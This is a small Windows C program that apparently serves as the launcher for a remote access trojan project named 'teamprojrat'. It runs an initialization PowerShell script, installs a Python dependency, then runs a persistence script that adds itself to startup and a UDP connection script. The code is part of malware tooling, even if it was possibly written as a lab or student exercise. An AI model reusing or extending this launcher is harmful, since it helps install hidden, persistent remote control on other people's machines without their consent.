#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>

int fileExists(TCHAR * file);

int main()
{
    if (fileExists("C:\\users\\ieuser\\Desktop\\teamprojrat-master\\initialize.ps1"))
    {
        system("start initialize.ps1");
    }
    if (!fileExists("C:\\users\\ieuser\\appdata\\local\\programs\\python\\python38-32\\Lib\\site-packages\\openpyxl"))
    {
        system("start /WAIT pip install openpyxl\n");
    }
    system("python ./persistence/add_startup.py\n");
    system("python ./UDP_Connection/pos.py\n");
    return 0;
}

int fileExists(TCHAR * file)
{
   WIN32_FIND_DATA FindFileData;
   HANDLE handle = FindFirstFile(file, &FindFileData) ;
   int found = handle != INVALID_HANDLE_VALUE;
   if(found) 
   {
       //FindClose(&handle); this will crash
       FindClose(handle);
   }
   return found;
}